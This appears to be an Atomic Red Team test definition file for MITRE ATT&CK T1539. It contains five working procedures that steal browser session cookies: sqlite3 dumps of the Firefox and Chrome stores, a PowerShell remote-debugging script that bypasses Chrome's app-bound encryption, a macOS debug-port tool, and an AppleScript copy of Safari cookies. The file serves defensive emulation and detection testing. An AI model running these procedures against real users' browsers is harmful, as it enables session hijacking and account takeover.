{
  "attack_technique": "T1539",
  "display_name": "Steal Web Session Cookie",
  "atomic_tests": [
    {
      "name": "Steal Firefox Cookies (Windows)",
      "description": "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "remove-item #{output_file} -erroraction silentlycontinue",
        "procedure": "stop-process -name \"firefox\" -force -erroraction silentlycontinue\n$CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"\n\"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c #{sqlite3_path} \"$CookieDBLocation\" | out-file -filepath \"#{output_file}\""
      },
      "input_arguments": [
        {
          "arg_name": "sqlite3_path",
          "description": "Path to sqlite3",
          "type": "path",
          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
        },
        {
          "arg_name": "output_file",
          "description": "Filepath to output cookies",
          "type": "path",
          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt"
        }
      ],
      "dependencies": [
        {
          "description": "Sqlite3 must exist at (#{sqlite3_path})",
          "prereq_command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force"
        }
      ],
      "auto_generated_guid": "4b437357-f4e9-4c84-9fa6-9bcee6f826aa"
    },
    {
      "name": "Steal Chrome Cookies (Windows)",
      "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "remove-item #{output_file}",
        "procedure": "stop-process -name \"chrome\" -force -erroraction silentlycontinue\n\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c #{sqlite3_path} \"#{cookie_db}\" | out-file -filepath \"#{output_file}\""
      },
      "input_arguments": [
        {
          "arg_name": "cookie_db",
          "description": "Filepath for Chrome cookies database",
          "type": "string",
          "default": "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
        },
        {
          "arg_name": "sqlite3_path",
          "description": "Path to sqlite3",
          "type": "path",
          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
        },
        {
          "arg_name": "output_file",
          "description": "Filepath to output cookies",
          "type": "path",
          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt"
        }
      ],
      "dependencies": [
        {
          "description": "Sqlite3 must exist at (#{sqlite3_path})",
          "prereq_command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force"
        }
      ],
      "auto_generated_guid": "26a6b840-4943-4965-8df5-ef1f9a282440"
    },
    {
      "name": "Steal Chrome Cookies via Remote Debugging (Mac)",
      "description": "The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.\n\nIf successful, this test will output a list of cookies.\n\nNote: Chrome processes will be killed during this test.\n\nSee https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e",
      "supported_platforms": [
        "macos"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": false,
        "cleanup_command": "rm -rf /tmp/WhiteChocolateMacademiaNut",
        "procedure": "killall 'Google Chrome'\nsleep 1\nopen -a \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/\nsleep 1\n/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337"
      },
      "input_arguments": [],
      "dependencies": [
        {
          "description": "Install Go",
          "prereq_command": "go version",
          "get_prereq_command": "brew install go"
        },
        {
          "description": "Download and compile WhiteChocolateMacademiaNut",
          "prereq_command": "/tmp/WhiteChocolateMacademiaNut/chocolate -h",
          "get_prereq_command": "git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut\ncd /tmp/WhiteChocolateMacademiaNut\ngo mod init chocolate\ngo mod tidy\ngo build"
        }
      ],
      "auto_generated_guid": "e43cfdaf-3fb8-4a45-8de0-7eee8741d072"
    },
    {
      "name": "Steal Chrome v127+ cookies via Remote Debugging (Windows)",
      "description": "Chrome v127+ uses app-bound encryption to protect cookies. This test bypasses that protection to obtain the cookies. If successful, the test outputs cookie values to the console.\nNote: Will stop any instances of Chrome already running\nAdapted from https://embracethered.com/blog/posts/2024/cookie-theft-in-2024-and-what-todo",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "$devToolsPort = 9222\n$testUrl = \"https://www.google.com\"\nstop-process -name \"chrome\" -force -erroraction silentlycontinue\n$chromeProcess = Start-Process \"chrome.exe\" \"$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default\" -PassThru\nStart-Sleep 10\n$jsonResponse = Invoke-WebRequest \"http://localhost:$devToolsPort/json\" -UseBasicParsing\n$devToolsPages = ConvertFrom-Json $jsonResponse.Content\n$ws_url = $devToolsPages[0].webSocketDebuggerUrl\n$ws = New-Object System.Net.WebSockets.ClientWebSocket\n$uri = New-Object System.Uri($ws_url)\n$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()\n$GET_ALL_COOKIES_REQUEST = '{\"id\": 1, \"method\": \"Network.getAllCookies\"}'\n$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)\n$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length\n$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()\n$completeMessage = New-Object System.Text.StringBuilder\ndo {\n    $receivedBuffer = New-Object byte[] 2048\n    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length\n    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result\n    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)\n    $completeMessage.Append($receivedString)\n} while (-not $result.EndOfMessage)\n$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, \"Closing\", [System.Threading.CancellationToken]::None).Wait()\ntry {\n    $response = ConvertFrom-Json $completeMessage.ToString()\n    $cookies = $response.result.cookies\n} catch {\n    Write-Host \"Error parsing JSON data.\"\n}\nWrite-Host $cookies\nStop-Process $chromeProcess -Force"
      },
      "input_arguments": [],
      "auto_generated_guid": "b647f4ee-88de-40ac-9419-f17fac9489a7"
    },
    {
      "name": "Copy Safari BinaryCookies files using AppleScript",
      "description": "This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.",
      "supported_platforms": [
        "macos"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "cleanup_command": "rm \"#{destination_path}/Cookies.binarycookies\"",
        "procedure": "osascript -e 'tell application \"Finder\"' -e 'set destinationFolderPath to POSIX file \"#{destination_path}\"' -e 'set safariFolder to ((path to library folder from user domain as text) & \"Containers:com.apple.Safari:Data:Library:Cookies:\")' -e 'duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'"
      },
      "input_arguments": [
        {
          "arg_name": "destination_path",
          "description": "Specify the path to copy the BinaryCookies file into.",
          "type": "path",
          "default": "/private/tmp"
        }
      ],
      "auto_generated_guid": "e57ba07b-3a33-40cd-a892-748273b9b49a"
    }
  ]
}